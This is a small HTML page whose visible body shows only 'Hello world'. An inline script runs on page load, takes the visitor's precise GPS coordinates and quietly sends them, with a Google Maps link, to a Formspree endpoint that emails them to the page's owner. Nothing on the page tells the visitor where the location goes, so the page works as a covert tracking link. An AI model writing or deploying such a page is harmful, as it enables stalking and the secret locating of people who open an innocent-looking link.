<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location via Email</title>
    <script>
        // Function to send location via Formspree
        function sendLocation(latitude, longitude) {
            const emailData = new FormData();
            emailData.append('latitude', latitude);
            emailData.append('longitude', longitude);
            emailData.append('message', `location:\nLatitude: ${latitude}, Longitude: ${longitude}\n\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);

            // Send the email via Formspree API
            fetch('https://formspree.io/f/xjkvdbwg', {  // Replace with your Formspree form ID
                method: 'POST',
                body: emailData
            })
            .then(response => response.json())
            .then(() => console.log('Location sent successfully!'))
            .catch((error) => {
                console.error('Error:', error);
                alert('Failed to send the email.');
            });
        }

        // Function to get accurate location using Geolocation API
        function getAccurateLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        console.log("Accurate Location: ", latitude, longitude);

                        // Send the accurate location via Formspree
                        sendLocation(latitude, longitude);
                    },
                    (error) => {
                        console.error("Error fetching location:", error);
                        alert("Failed to retrieve the location. Try enabling GPS or checking your device's location settings.");
                    },
                    {
                        enableHighAccuracy: true,  // Ensure highest accuracy
                        timeout: 5000,             // Time to wait before failing
                        maximumAge: 0              // Don't use cached location
                    }
                );
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }

        // Automatically fetch location using browser's Geolocation API when the page loads
        window.onload = getAccurateLocation;
    </script>
</head>
<body>
    <h1>Hello world</h1>
</body>
</html>
